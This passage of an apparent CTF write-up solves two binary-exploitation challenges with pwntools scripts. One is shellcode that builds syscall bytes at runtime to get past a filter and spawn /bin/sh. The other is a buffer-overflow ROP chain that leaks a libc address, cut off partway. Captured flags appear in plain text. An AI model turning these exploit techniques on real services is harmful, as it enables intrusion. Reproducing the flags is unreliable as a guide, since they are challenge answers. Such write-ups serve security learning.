+Flag: umcs{willow_tree_campsite}&lt;/p>
+&lt;h2 id="pwn-babysc">&lt;strong>PWN: Babysc&lt;/strong>&lt;/h2>
+&lt;p>&lt;a class="link" href="https://github.com/umcybersec/umcs_preliminary/tree/main/pwn-babysc" target="_blank" rel="noopener"
+>https://github.com/umcybersec/umcs_preliminary/tree/main/pwn-babysc&lt;/a>&lt;/p>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image16.png"
+width="940"
+height="519"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image16_huc061c530e018d746b62d6caed4df1d51_110509_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image16_huc061c530e018d746b62d6caed4df1d51_110509_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="181"
+data-flex-basis="434px"
+>&lt;/strong>&lt;/p>
+&lt;p>From the source code given, the &lt;code>vuln()&lt;/code> function shows that it reads 4096 bytes from the input and checks the bad code received which are &lt;code>0x80cd&lt;/code> (int 0x80), &lt;code>0x340f&lt;/code> (sysenter), and &lt;code>0x050f&lt;/code> (syscall) to prevent syscall and executes from the input. So I am using the &lt;a class="link" href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"
+>pwntools&lt;/a> library given from the online to make it easily implement my binary exploitation. Lastly, the python script is on the below:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exe&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;./babysc&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">checksec&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#context.log_level = &amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">arch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;34.133.69.112&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10001&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#sh = process(exe)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">forbidden_pairs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x0f\x05&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x0f\x34&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\xcd\x80&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shellcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> /* Get address of placeholder using GAS RIP-relative syntax */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> lea rbx, [rip + placeholder]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> /* Write forbidden syscall bytes DYNAMICALLY (0x0f 0x05) */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> mov byte ptr [rbx], 0x0f
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> mov byte ptr [rbx + 1], 0x05
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> /* Set up execve(&amp;#34;/bin/sh&amp;#34;, 0, 0) */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> xor rsi, rsi
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> push rsi
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> mov rdi, 0x68732f2f6e69622f /* /bin//sh */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> push rdi
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> mov rdi, rsp
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> xor rdx, rdx
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> mov eax, 0x3b /* execve syscall number */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> jmp rbx /* Jump to modified code */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">placeholder:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> .byte 0x90, 0x90 /* Placeholder for syscall */
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcode&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pair&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">pair&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">forbidden_pairs&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;BAD BYTE --&amp;gt; 0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s1">02x&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;ASCII --&amp;gt; &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvline&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x90&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The shellcode given to the binary will:&lt;/p>
+&lt;ol>
+&lt;li>Calculate the address of the placeholder at runtime&lt;/li>
+&lt;li>Write the forbidden syscall bytes dynamically&lt;/li>
+&lt;li>Execute /bin/sh using the execve syscall&lt;/li>
+&lt;/ol>
+&lt;p>After that, I execute the python script I successfully enter to the instance given then I use &lt;code>cat /flag&lt;/code> (based on the Dockerfile given) to get the flag content. Boom flag found.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image17.png"
+width="940"
+height="601"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image17_hu91ef5e63e6f5513188d0c82f0ed0ed6f_350563_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image17_hu91ef5e63e6f5513188d0c82f0ed0ed6f_350563_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="156"
+data-flex-basis="375px"
+>&lt;/p>
+&lt;p>Flag: umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}&lt;/p>
+&lt;h2 id="pwn-liveleak">&lt;strong>PWN: Liveleak&lt;/strong>&lt;/h2>
+&lt;p>From this question, I found the given “libc” library and “ld” library so I found the online tool called “&lt;a class="link" href="https://github.com/io12/pwninit" target="_blank" rel="noopener"
+>pwninit&lt;/a>” to patch the given binary to make the binary run using the given “libc” library. Then, I try to decompile the binary to understand the source code.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image18.png"
+width="244"
+height="237"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image18_hu6aa5ef19f74f58166a706cfb271144b8_4375_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image18_hu6aa5ef19f74f58166a706cfb271144b8_4375_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="102"
+data-flex-basis="247px"
+>&lt;br>
+Content of &lt;code>main&lt;/code> function&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image19.png"
+width="277"
+height="229"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image19_hu79ff9412d17174cba16c59cbdd6aeded_4970_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image19_hu79ff9412d17174cba16c59cbdd6aeded_4970_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="120"
+data-flex-basis="290px"
+>&lt;br>
+Content of &lt;code>vuln&lt;/code> function&lt;/p>
+&lt;p>Notice that, inside &lt;code>vuln()&lt;/code> function it contains the vulnerability for buffer overflow attack because of using &lt;code>fgets()&lt;/code> function but the size does not fit into the declared variable. So write the python script for the exploitation.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exe&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./chall_patched&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./libc.so.6&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ROP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rop&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">find_gadget&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;pop rdi&amp;#34;&lt;/span>&lt;span class="p">])[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rop&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">find_gadget&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;ret&amp;#34;&lt;/span>&lt;span class="p">])[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">puts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_plt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">puts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">vuln&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">vuln&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">conn&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">LOCAL&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;34.133.69.112&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10007&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Leak puts@got.plt` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;Enter your input: &lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">72&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Overflow buffer (64) + RBP (8) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pop_rdi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># (1st argument for `puts`) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">puts_got&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Address of `puts` in GOT (to leak) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">puts_plt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Call `puts` to print the leaked address &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vuln&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Return to vuln() for second payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1"># Align stack for vuln() return&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)[:&lt;/span>&lt;span class="mi">127&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1"># Trim to 127 bytes (exclude NULL) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Parse leaked address &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">leaked_puts&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvline&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">leaked_puts&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">puts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Libc base: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Send shell payload` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;Enter your input: &lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
